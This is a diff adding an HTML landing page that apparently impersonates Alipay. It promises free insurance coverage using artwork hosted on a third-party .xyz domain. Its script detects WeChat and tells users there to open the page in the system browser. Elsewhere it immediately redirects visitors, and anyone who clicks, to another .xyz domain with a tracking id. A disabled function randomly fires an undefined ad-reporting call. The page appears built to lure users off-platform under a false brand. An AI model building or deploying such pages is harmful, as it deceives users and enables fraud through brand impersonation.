@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>支付宝免费领取保单</title>
+    <!-- <script src="https://sspstatic.vivo.com.cn/ssp/js/vadevent.1.0.0.js"></script> -->
+    <!-- <script src="https://apph5wsdl.vivo.com.cn/appstore/ad/ssp/js/vadevent.1.0.0.js"></script> -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+        }
+
+        #Box {
+            width: 100%;
+            border: 0;
+            height: 100vh;
+        }
+
+        /* body {
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        } */
+
+        button {
+            width: 300px;
+            height: 300px;
+        }
+
+        div {
+            box-sizing: border-box;
+        }
+
+        .alivgc {
+            width: 100vw;
+            height: 100%;
+            background-color: #3874f6;
+            background-image: url(https://static.zixunkankan.xyz/zfbsmallapp/h5/images/alitop.png);
+            background-size: 100% auto;
+            background-repeat: no-repeat;
+            padding-top: 65vw;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .openButton {
+            width: 81vw;
+            height: 14vw;
+            background-color: #fff;
+            border-radius: 1vw;
+            margin-bottom: 5vw;
+            color: rgb(22, 119, 255);
+            text-align: center;
+            line-height: 14vw;
+            font-size: 5vw;
+            text-decoration: none;
+            font-family: AlibabaSans, PingFang SC, -apple-system, BlinkMacSystemFont, Helvetica Neue, Helvetica, sans-serif;
+        }
+
+        .fixed_tigrh_top {
+            position: fixed;
+            top: 0;
+            right: 10px;
+            display: none;
+        }
+
+        .sanjiaoxing {
+            margin-left: 90%;
+            width: 0;
+            height: 0;
+            border-left: 3vw solid transparent;
+            border-right: 3vw solid transparent;
+            border-bottom: 3vw solid rgba(0, 0, 0, .7);
+        }
+
+        .opneInBrowser {
+            height: 15.959vw;
+            display: flex;
+            align-items: center;
+            background-color: rgba(0, 0, 0, .7);
+            border-radius: 1vw;
+            padding: 0 2vw;
+            
+        }
+
+        .left_diqiu {
+            width: 11.2vw;
+            height: 11.2vw;
+
+
+        }
+
+        .right_close {
+            width: 4vw;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 2vw 0;
+        }
+
+        .right_close>img {
+            width: 4vw;
+            height: 4vw;
+        }
+
+        .centerStyle {
+            padding: 0 2vw;
+            font-size: 5vw;
+            text-decoration: none;
+            font-family: AlibabaSans, PingFang SC, -apple-system, BlinkMacSystemFont, Helvetica Neue, Helvetica, sans-serif;
+            color: #fff;
+        }
+
+        .cengetStle {
+            color: #ff9f19;
+            margin-left: 10px;
+        }
+
+        .bottomstyle {
+            text-align: center;
+            font-size: 4.3vw;
+            color: rgb(255, 255, 255);
+            font-weight: 300;
+            line-height: 7vw;
+            font-family: Helvetica Neue, Helvetica, STHeiTi, sans-serif;
+            margin-top: 20vw;
+        }
+        .new_bg_qx {
+            width: 100vw;
+            height: 216.5vw;
+            background-image: url(https://static.zixunkankan.xyz/zfbsmallapp/fuweng/images/yunqimanman/zfbbg_wx.png);
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- <div class="alivgc" id="pagediv">
+        <div class="openButton">浏览器打开支付宝</div>
+        <div class="openButton">点击免费领取八十万骑行保障</div>
+        <div class="bottomstyle">
+            <p>APP开发者:支付宝(杭州) 信息技术有限公司</p>
+            <p>APP版本号: 10.5.30.9000</p>
+            <p>APP更新时间: 2023/10/18</p>
+            <p style="margin-top: 20px;">收费规则 | 隐私政策 | 服务协议更新 | 权限列表</p>
+            <p>网站备案: 浙ICP备16025414号-9</p>
+        </div>
+    </div> -->
+    <div class="new_bg_qx" id="pagediv">
+    </div>
+    <div class="fixed_tigrh_top" id="openBrowser">
+        <div class="sanjiaoxing"></div>
+        <div class="opneInBrowser">
+            <img class="left_diqiu" src="https://static.zixunkankan.xyz/zfbsmallapp/h5/images/wangluo.svg" alt="">
+            <div class="centerStyle">
+                <p>请在<span class="cengetStle">系统浏览器中打开</span></p>
+                <p> 即可打开支付宝免费领取</p>
+            </div>
+            <div class="right_close">
+                <img src="https://static.zixunkankan.xyz/zfbsmallapp/h5/images/close.svg" alt="">
+            </div>
+        </div>
+    </div>
+
+    <!-- <img id="openBrowser" class="opneInBrowser" src="https://static.zixunkankan.xyz/zfbsmallapp/h5/images/openllq.png"
+        alt=""> -->
+    <script>
+        let objSearch = {
+            hid: "999",
+        };
+        function getUrlParams(urlParam = "") {
+            // 截取url后面参数
+            const search_url = urlParam || window.location.search;
+            let myyyy = search_url.substring(1, search_url.length);
+            if (!myyyy) {
+                return objSearch;
+            }
+            let nerList = myyyy.split("&");
+            for (let i = 0; i < nerList.length; i++) {
+                objSearch[nerList[i].split("=")[0]] = decodeURIComponent(
+                    nerList[i].split("=")[1]
+                );
+            }
+            return objSearch;
+        }
+        const createIframe = (hid) => {
+            const geniframe = document.createElement("IFRAME");
+            geniframe.setAttribute("id", "Box")
+            geniframe.frameBorder = 0;
+            // geniframe.scrolling = "no";
+            geniframe.src = httpBaseUrl + hid;
+            document.body.appendChild(geniframe);
+        }
+        getUrlParams()
+
+        const httpBaseUrl = 'https://new.kuwen10005.xyz/?hid=' + objSearch.hid
+        const createInapp = () => {
+            window.location.href = httpBaseUrl
+        }
+        const isWeiXin = () => {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.match(/MicroMessenger/i) && ua.match(/MicroMessenger/i)[0] === 'micromessenger') {
+                return true;
+            } else {
+                return false;
+            }
+        }
+        window.onload = function () {
+            if (isWeiXin()) {
+                // 微信环境打开的
+                document.getElementById("openBrowser").style.display = "block"
+            } else {
+                // 其他环境打开
+                createInapp()
+            }
+            document.getElementById("pagediv").addEventListener('click', function () {
+                if (isWeiXin()) {
+                    return
+                }
+                createInapp()
+            })
+        }
+        console.log(objSearch)
+        function getRandomNumber(n, m) {
+            var random = Math.floor(Math.random() * (m - n + 1) + n)
+            return random
+        }
+        function getConfig(hid = '0') {
+            var url = "https://new.zixunkankan.top/api/h5setting?hid=" + hid;//绝对路径不容易出错，任何情况下都可以访问到。
+            //1、声明载体xhr对象
+            var xhr = new XMLHttpRequest();
+            //2、发起请求，设置请求方式，地址，异步
+            xhr.open("get", url, true);//默认为true也就是异步
+            //3、等待接通
+            //3、通过事件监听状态
+            xhr.onreadystatechange = function () {
+                //readyState状态:ajax的执行阶段
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    // console.log(xhr.responseText);
+                    const response = JSON.parse(xhr.responseText)
+                    console.log(response)
+                    const randomNum = getRandomNumber(1, 100)
+                    if (randomNum <= response.data.rate) {
+                        sendvivo()
+                    }
+                }
+            }
+            //4、发送
+            xhr.send(null);
+        }
+        // getConfig(objSearch.hid)
+    </script>
+</body>
+
+</html>
